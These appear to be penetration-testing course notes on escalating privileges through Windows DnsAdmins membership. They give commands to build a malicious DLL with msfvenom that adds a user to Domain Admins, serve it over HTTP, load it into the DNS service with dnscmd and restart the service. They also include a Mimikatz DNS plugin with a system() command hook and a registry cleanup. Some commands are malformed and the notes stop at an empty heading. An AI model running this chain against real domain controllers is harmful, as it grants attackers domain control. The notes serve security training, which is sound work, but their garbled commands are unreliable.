The Windows DNS service supports custom plugins and can call functions from them to resolve
name queries that are not in the scope of any locally hosted DNS zones.

The DNS service runs as `NT AUTHORITY\SYSTEM`. Membership in this group could potentially be
leveraged to escalate privileges on the DC or in a situation where a separate server is acting
as the DNS server for the domain.

It's possible to use the built-in `dnscmd` utility to specify the path of the plugin DLL.
Here's an example of an attack when DNS is run on a DC:

https://adsecurity.org/?p=4064

- DNS management is performed over RPC
- `SeverLevelPluginDll` allows us to load a custom DLL with no verification of the path using `dnscmd`
- When a `DnsAdmins`  group member runs the command below, the `ServerLevelPluginDll` regkey is populated.

- When the DNS service is restarted, the DLL in this path will be loaded 
- (ie, a network share DC can access).

- An attacker can load a custom DLL to obtain a reverse shell or load tools like Mimikatz as a DLL.

## Leveraging DnsAdmins Access

##### Generating Malicious DLL
```bash
msfvenom - windows/x64/exec cmd=
	'net group "domain admins" netadm /add /domain' -f dll -o adduser.dll

sudo python3 -m http.server 7777
```

- Download the DLL to the target
- Use the `dnscmd` utility to load a custom DLL with non-privileged user
```
dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll
( Access Denied )

Get-ADGroupMember -Identity DnsAdmins
```

- Only DnsAdmins are allowed to perform this
- Restart the DNS service/Wait for a Server restart

##### Finding User's SID for the DNS Service
```
wmic useraccount where name="netadm" get sid
sc.exe sdshow DNS
sc stop dns
sc start dns
net group "Domain Admins" /dom
```

Here's an explaination of Security Descriptor Definition Language (SDDL) syntax:
https://academy.hackthebox.com/module/49/section/1016

## Cleaning Up For Our Customer
```
reg query \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters
reg delete \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters
					/v ServerLevelPluginDll
sc.exe start dns
sc query dns
```

## Using Mimilib.dll

```cpp
/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
#include "kdns.h"

DWORD WINAPI kdns_DnsPluginInitialize(
	PLUGIN_ALLOCATOR_FUNCTION pDnsAllocateFunction, 
	PLUGIN_FREE_FUNCTION pDnsFreeFunction
)
{
	return ERROR_SUCCESS;
}

DWORD WINAPI kdns_DnsPluginCleanup()
{
	return ERROR_SUCCESS;
}

DWORD WINAPI kdns_DnsPluginQuery(
	PSTR pszQueryName, 
	WORD wQueryType, 
	PSTR pszRecordOwnerName, 
	PDB_RECORD *ppDnsRecordListHead
)
{
	FILE * kdns_logfile;
#pragma warning(push)
#pragma warning(disable:4996)
	if(kdns_logfile = _wfopen(L"kiwidns.log", L"a"))
#pragma warning(pop)
	{
		klog(kdns_logfile, L"%S (%hu)\n", pszQueryName, wQueryType);
		fclose(kdns_logfile);
	    system("ENTER COMMAND HERE");
	}
	return ERROR_SUCCESS;
}
```

## Creating a WPAD Record

